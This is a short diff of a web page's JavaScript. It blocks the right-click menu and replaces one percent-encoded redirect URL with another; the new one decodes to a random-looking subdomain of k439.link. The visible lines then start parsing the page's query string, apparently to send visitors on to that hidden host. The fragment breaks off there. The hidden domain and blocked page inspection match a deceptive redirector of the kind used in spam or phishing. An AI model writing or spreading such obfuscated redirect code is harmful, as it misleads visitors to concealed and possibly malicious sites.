@@ -17,7 +17,7 @@ setInterval(function () {
 
 
 document.oncontextmenu = function () { return false; };    
- var x='https://%68%6d%76%70%73%2e%6b%34%33%39%2e%6c%69%6e%6b/?heedcu#';
+ var x='https://%64%68%77%65%62%66%68%75%77%65%76%68%2e%6b%34%33%39%2e%6c%69%6e%6b/?heedcu#';
     $(function () {
         let u = window.document.location.href.toString().split("?");
         if (typeof (u[1]) == "string") {
